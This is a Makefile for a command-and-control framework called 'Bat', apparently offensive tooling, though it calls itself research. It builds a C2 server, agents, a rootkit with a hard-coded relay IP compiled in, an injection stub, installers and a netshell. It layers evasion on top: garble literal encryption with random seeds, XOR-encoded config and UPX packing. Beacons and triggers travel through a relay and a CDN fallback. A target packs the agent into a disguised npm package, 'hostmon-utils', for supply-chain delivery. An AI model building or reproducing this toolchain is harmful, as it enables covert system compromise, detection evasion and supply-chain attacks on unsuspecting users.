# Bat v9   C2 research framework
#
# NAMED PROFILES (recommended) 
#
#   make lab SECRET=<hex>          # Direct mode: agent → relay:9443, UDP trigger
#   make cdn SECRET=<hex>          # CDN mode: agent → Cloudflare → relay:443, UDP trigger
#   make singularity SECRET=<hex>  # Direct mode: ICMP trigger (no UDP port needed)
#
#   All profiles require SECRET=<hex>. Relay IP is pulled from RELAY env var
#   or defaults to 56.125.161.54. Override: make lab RELAY=1.2.3.4 SECRET=<hex>
#
# LOW-LEVEL VARIABLES (for custom builds) 
#
#   make all                        # build all x86_64 targets: rootkit + agent + installer + server
#   make arm64                      # build arm64: server + agent
#   make server-arm64               # bat-server arm64 only (no rootkit/nasm needed)
#   make server                     # bat-server x86_64 only
#   make pack                       # build + UPX compress agents
#   make clean
#
#   SERVER=<host:port>    primary C2 address     (e.g. __CDN_DOMAIN__:443)
#   FALLBACK=<host:port>  emergency fallback      (e.g. 56.125.161.54:9443)
#   RAWSOCK_CB=<ip:port>  rawsock callback        (e.g. 56.125.161.54:9443)
#   KCC_ADDR=<ip:port>    KCC compile endpoint    (e.g. 56.125.161.54:9444)
#   TRIGGER=<mode>        trigger listener mode   (udp | icmp | both, default: udp)
#   INTERVAL=<duration>   beacon interval         (default: 30s)
#   SECRET=<hex>          HMAC shared secret
#   C2_IP=<ip>            IP baked into rootkit   (auto-derived from SERVER)
#   C2_PORT=<port>        port baked into rootkit  (default: 9443)
#
# PORT SEMANTICS (relay architecture) 
#
#   relay:443  → nginx → relay:127.0.0.1:8443 → batrev tunnel → local bat-server:9443
#   relay:9443 → GatewayPorts (batrev) → local bat-server:9443  [direct agent path]
#   relay:9444 → kcc-server.py (HTTPS, HMAC auth)               [K-series compile]
#
#   bat-server ALWAYS runs on local:9443.
#   batrev ALWAYS maps:
#     -R 127.0.0.1:8443:localhost:9443   (nginx CDN path)
#     -R 0.0.0.0:9443:localhost:9443     (direct agent path   GatewayPorts yes required)
#     -L 8444:localhost:8444             (local KCC/rawsock inspection)

GO      ?= go
GARBLE  ?= $(shell which garble 2>/dev/null || echo $(HOME)/go/bin/garble)
VERSION := v10
OUTDIR  := ../bin
RELAY   ?= 56.125.161.54
SERVER     ?=
FALLBACK   ?=
RAWSOCK_CB ?=
KCC_ADDR   ?=
TRIGGER    ?= udp
INTERVAL   ?= 30s
SECRET     ?=
SSH_KEY    ?=
C2_IP   ?=
C2_PORT ?= 9443

# Extract IP from SERVER if C2_IP not explicitly set
ifeq ($(C2_IP),)
ifneq ($(SERVER),)
C2_IP := $(shell echo '$(SERVER)' | cut -d: -f1)
endif
endif

# Go build flags 
# Config values (SERVER, SECRET, etc.) are NOT injected via -X ldflags.
# garble -literals cannot encrypt ldflag values   they appear plaintext in the binary.
# Instead, make genconfig generates internal/config/config_gen.go with XOR(0x5A)
# encoded constants. garble then encrypts those constants: two layers of obfuscation.
LDFLAGS_INNER := -s -w -buildid=
FLAGS         := -ldflags="$(LDFLAGS_INNER)" -trimpath

# garble flags: -literals encrypts all string constants, -seed per-build randomization
GARBLE_FLAGS := -literals -tiny -seed=random

# Named profiles 
# Each profile is a complete, self-contained build invocation.
# RELAY and SECRET must be set (SECRET has no default   intentional).

.PHONY: lab cdn singularity

lab:
	@[ -n "$(SECRET)" ] || (echo "ERROR: SECRET= required. Example: make lab SECRET=9aac8c..." && exit 1)
	$(MAKE) \
		SERVER=$(RELAY):9443 \
		RAWSOCK_CB=$(RELAY):9443 \
		KCC_ADDR=$(RELAY):9444 \
		TRIGGER=udp \
		SECRET=$(SECRET) \
		all

cdn:
	@[ -n "$(SECRET)" ] || (echo "ERROR: SECRET= required." && exit 1)
	$(MAKE) \
		SERVER=__CDN_DOMAIN__:443 \
		FALLBACK=$(RELAY):9443 \
		RAWSOCK_CB=$(RELAY):9443 \
		KCC_ADDR=$(RELAY):9444 \
		TRIGGER=udp \
		SECRET=$(SECRET) \
		all

singularity:
	@[ -n "$(SECRET)" ] || (echo "ERROR: SECRET= required." && exit 1)
	$(MAKE) \
		SERVER=$(RELAY):9443 \
		RAWSOCK_CB=$(RELAY):9443 \
		KCC_ADDR=$(RELAY):9444 \
		TRIGGER=icmp \
		SECRET=$(SECRET) \
		all

# Rootkit .so 
ROOTKIT_SO      := $(OUTDIR)/bat-rootkit.so
ROOTKIT_PAYLOAD := cmd/bat-agent/payload/rootkit.so

# Inject stub 
# stub.asm compiled to raw binary by nasm; embedded into bat-agent at build time
# Copied to internal/ttp/inject_stub.bin for go:embed (cannot use .. in embed paths)
INJECT_STUB     := inject/stub.bin
INJECT_PAYLOAD  := internal/ttp/inject_stub.bin

# genconfig 
# Generates internal/config/config_gen.go with XOR(0x5A)-encoded config constants.
# Called automatically by all binary build targets.
# Requires: SERVER, SECRET (and optionally FALLBACK, RAWSOCK_CB, KCC_ADDR, INTERVAL, TRIGGER).
.PHONY: genconfig
genconfig:
	@[ -n "$(SECRET)" ] || (echo "ERROR: SECRET= required. Example: make lab SECRET=<hex>" && exit 1)
	@SERVER=$(SERVER) FALLBACK=$(FALLBACK) RAWSOCK_CB=$(RAWSOCK_CB) \
	 KCC_ADDR=$(KCC_ADDR) INTERVAL=$(INTERVAL) SECRET=$(SECRET) TRIGGER=$(TRIGGER) \
	 SSH_KEY=$(SSH_KEY) \
	 python3 internal/config/gen.py > internal/config/config_gen.go
	@echo "[genconfig] internal/config/config_gen.go written"

.PHONY: all x86_64 arm64 server server-amd64 server-arm64 \
        agents-amd64 agents-arm64 pack clean rootkit inject-stub \
        netshell netshell-amd64 netshell-arm64 garble-netshell garble-agent

all: rootkit inject-stub x86_64

rootkit:
	$(MAKE) -C rootkit \
		CC=x86_64-linux-gnu-gcc STRIP=x86_64-linux-gnu-strip \
		C2_IP=$(C2_IP) C2_PORT=$(C2_PORT)
	cp $(ROOTKIT_SO) $(ROOTKIT_PAYLOAD)

inject-stub: $(INJECT_STUB)

$(INJECT_STUB): inject/stub.asm
	$(MAKE) -C inject
	cp $(INJECT_STUB) $(INJECT_PAYLOAD)
	@echo "inject stub: $$(wc -c < $@) bytes"

# Server targets (operator machine   no rootkit dependency) 
server server-amd64: $(OUTDIR)/bat-server-$(VERSION)-x86_64

server-arm64: $(OUTDIR)/bat-server-$(VERSION)-arm64

# Agent delivery vectors (target machines) 
# agents-amd64: agent + installer + cli for x86_64 targets (most cloud VMs)
# agents-arm64: agent + installer + cli for arm64 targets (Graviton, Pi, etc.)
#   NOTE: rootkit.so is always compiled for x86_64 (TTP install_rootkit degrades
#         on arm64 targets; all other TTPs including K-series work correctly).
agents-amd64: rootkit inject-stub \
    $(OUTDIR)/bat-agent-$(VERSION)-x86_64 \
    $(OUTDIR)/bat-installer-$(VERSION)-x86_64 \
    $(OUTDIR)/bat-cli-$(VERSION)-x86_64

agents-arm64: rootkit inject-stub \
    $(OUTDIR)/bat-agent-$(VERSION)-arm64 \
    $(OUTDIR)/bat-installer-$(VERSION)-arm64 \
    $(OUTDIR)/bat-cli-$(VERSION)-arm64

# Legacy combined targets
x86_64: agents-amd64 $(OUTDIR)/bat-server-$(VERSION)-x86_64

arm64: agents-arm64 $(OUTDIR)/bat-server-$(VERSION)-arm64

# Build rules 
$(OUTDIR)/bat-server-$(VERSION)-x86_64: genconfig
	GOOS=linux GOARCH=amd64 $(GO) build $(FLAGS) -o $@ ./cmd/bat-server/

$(OUTDIR)/bat-server-$(VERSION)-arm64: genconfig
	GOOS=linux GOARCH=arm64 $(GO) build $(FLAGS) -o $@ ./cmd/bat-server/

$(OUTDIR)/bat-agent-$(VERSION)-x86_64: genconfig $(ROOTKIT_PAYLOAD) $(INJECT_STUB)
	GOOS=linux GOARCH=amd64 $(GO) build $(FLAGS) -o $@ ./cmd/bat-agent/

$(OUTDIR)/bat-agent-$(VERSION)-arm64: genconfig $(ROOTKIT_PAYLOAD) $(INJECT_STUB)
	GOOS=linux GOARCH=arm64 $(GO) build $(FLAGS) -o $@ ./cmd/bat-agent/

# netshell targets 
# Standard (unobfuscated)   for dev/testing
$(OUTDIR)/netshell-$(VERSION)-x86_64: genconfig $(ROOTKIT_PAYLOAD) $(INJECT_STUB)
	GOOS=linux GOARCH=amd64 $(GO) build $(FLAGS) -o $@ ./cmd/netshell/

$(OUTDIR)/netshell-$(VERSION)-arm64: genconfig $(ROOTKIT_PAYLOAD) $(INJECT_STUB)
	GOOS=linux GOARCH=arm64 $(GO) build $(FLAGS) -o $@ ./cmd/netshell/

netshell netshell-amd64: $(ROOTKIT_PAYLOAD) inject-stub $(OUTDIR)/netshell-$(VERSION)-x86_64
netshell-arm64: $(ROOTKIT_PAYLOAD) inject-stub $(OUTDIR)/netshell-$(VERSION)-arm64

# garble-obfuscated builds 
# garble -literals: encrypts all string literals at compile time
# garble -tiny: removes DWARF, reduces panic output
# garble -seed=random: unique obfuscation per build (no reproducible binary fingerprint)
garble-netshell: genconfig $(ROOTKIT_PAYLOAD) inject-stub
	GOOS=linux GOARCH=amd64 $(GARBLE) $(GARBLE_FLAGS) build -ldflags="$(LDFLAGS_INNER)" -trimpath -o $(OUTDIR)/netshell-$(VERSION)-x86_64 ./cmd/netshell/
	GOOS=linux GOARCH=arm64 $(GARBLE) $(GARBLE_FLAGS) build -ldflags="$(LDFLAGS_INNER)" -trimpath -o $(OUTDIR)/netshell-$(VERSION)-arm64  ./cmd/netshell/
	@echo "[garble] netshell obfuscated builds done"

garble-agent: genconfig $(ROOTKIT_PAYLOAD) inject-stub
	GOOS=linux GOARCH=amd64 $(GARBLE) $(GARBLE_FLAGS) build -ldflags="$(LDFLAGS_INNER)" -trimpath -o $(OUTDIR)/bat-agent-$(VERSION)-x86_64 ./cmd/bat-agent/
	GOOS=linux GOARCH=arm64 $(GARBLE) $(GARBLE_FLAGS) build -ldflags="$(LDFLAGS_INNER)" -trimpath -o $(OUTDIR)/bat-agent-$(VERSION)-arm64  ./cmd/bat-agent/
	@echo "[garble] bat-agent obfuscated builds done"

$(OUTDIR)/bat-installer-$(VERSION)-x86_64: $(OUTDIR)/bat-agent-$(VERSION)-x86_64
	cp $(OUTDIR)/bat-agent-$(VERSION)-x86_64 cmd/bat-installer/payload/agent
	GOOS=linux GOARCH=amd64 $(GO) build $(FLAGS) -o $@ ./cmd/bat-installer/
	rm -f cmd/bat-installer/payload/agent

$(OUTDIR)/bat-installer-$(VERSION)-arm64: $(OUTDIR)/bat-agent-$(VERSION)-arm64
	cp $(OUTDIR)/bat-agent-$(VERSION)-arm64 cmd/bat-installer/payload/agent
	GOOS=linux GOARCH=arm64 $(GO) build $(FLAGS) -o $@ ./cmd/bat-installer/
	rm -f cmd/bat-installer/payload/agent

$(OUTDIR)/bat-cli-$(VERSION)-x86_64: $(OUTDIR)/bat-agent-$(VERSION)-x86_64
	cp $(OUTDIR)/bat-agent-$(VERSION)-x86_64 cmd/bat-cli/payload/agent
	GOOS=linux GOARCH=amd64 $(GO) build $(FLAGS) -o $@ ./cmd/bat-cli/
	rm -f cmd/bat-cli/payload/agent

$(OUTDIR)/bat-cli-$(VERSION)-arm64: $(OUTDIR)/bat-agent-$(VERSION)-arm64
	cp $(OUTDIR)/bat-agent-$(VERSION)-arm64 cmd/bat-cli/payload/agent
	GOOS=linux GOARCH=arm64 $(GO) build $(FLAGS) -o $@ ./cmd/bat-cli/
	rm -f cmd/bat-cli/payload/agent

# npm-package: builds bat-npm tarball with embedded agent for supply chain simulation.
# Output: $(OUTDIR)/hostmon-utils-<version>.tgz
# Usage:  npm install $(OUTDIR)/hostmon-utils-<version>.tgz
npm-package: $(OUTDIR)/bat-agent-$(VERSION)-x86_64
	cp $(OUTDIR)/bat-agent-$(VERSION)-x86_64 ../npm/bin/linux-x64/agent
	cd ../npm && npm pack --quiet 2>/dev/null
	mv ../npm/hostmon-utils-*.tgz $(OUTDIR)/ 2>/dev/null || mv ../npm/@hostmon-utils-*.tgz $(OUTDIR)/ 2>/dev/null || true
	rm -f ../npm/bin/linux-x64/agent
	@echo "npm package: $(OUTDIR)/hostmon-utils-*.tgz"
	@echo "Install:  npm install -g $(OUTDIR)/hostmon-utils-<version>.tgz"
	@echo "Or:       npm install $(OUTDIR)/hostmon-utils-<version>.tgz"

pack: all
	@which upx >/dev/null 2>&1 \
		&& upx --best $(OUTDIR)/bat-agent-$(VERSION)-x86_64 \
		|| echo "upx not installed, skipping"

clean:
	rm -f $(OUTDIR)/bat-*-$(VERSION)-*
	rm -f $(OUTDIR)/netshell-$(VERSION)-*
	rm -f $(OUTDIR)/hostmon-utils-*.tgz $(OUTDIR)/@hostmon-utils-*.tgz
	rm -f $(ROOTKIT_SO) $(ROOTKIT_PAYLOAD)
	rm -f $(INJECT_STUB) $(INJECT_PAYLOAD)
	rm -f cmd/bat-installer/payload/agent
	rm -f cmd/bat-cli/payload/agent
	rm -f ../npm/bin/linux-x64/agent
